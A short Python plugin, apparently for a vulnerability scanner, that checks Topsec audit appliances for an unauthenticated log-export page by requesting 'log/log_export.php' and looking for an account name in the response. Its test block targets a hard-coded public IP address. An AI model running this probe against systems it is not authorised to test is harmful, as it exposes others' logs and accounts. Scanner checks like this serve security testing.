#!/usr/bin/python
#-*- encoding:utf-8 -*-
#__author__ = '1c3z'
#ref http://wooyun.org/bugs/wooyun-2015-0116821

def assign(service, arg):
    if service == "topsec_ta-w" or service == "topsec_topaudit":
        return True, arg


def audit(arg):
    payload = 'log/log_export.php'
    url = arg + payload
    code, head,res, errcode, _ = curl.curl2(url)
    if code == 200 and '\tsuperman\t' in res and '<p>' not in res:
        security_hole(url)
                        
if __name__ == '__main__':
    from dummy import *
    audit(assign('topsec_ta-w', 'http://211.137.103.100:8080/')[1])